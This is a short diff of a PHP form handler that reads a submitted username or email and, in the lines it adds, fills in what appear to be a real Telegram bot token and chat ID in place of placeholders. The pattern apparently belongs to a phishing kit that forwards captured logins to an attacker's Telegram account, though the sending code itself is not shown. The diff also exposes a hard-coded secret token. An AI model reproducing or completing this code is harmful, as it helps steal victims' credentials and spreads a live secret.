@@ -2,8 +2,8 @@
 session_start();
 
 // Telegram setup
-$botToken = 'YOUR_BOT_TOKEN';
-$chatId = 'YOUR_CHAT_ID';
+$botToken = '6627263483:AAG5WQX0ha9hsx740CwSUtkMjwDONp0Eh_w';
+$chatId = '5248818941';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $email = trim($_POST['username'] ?? '');
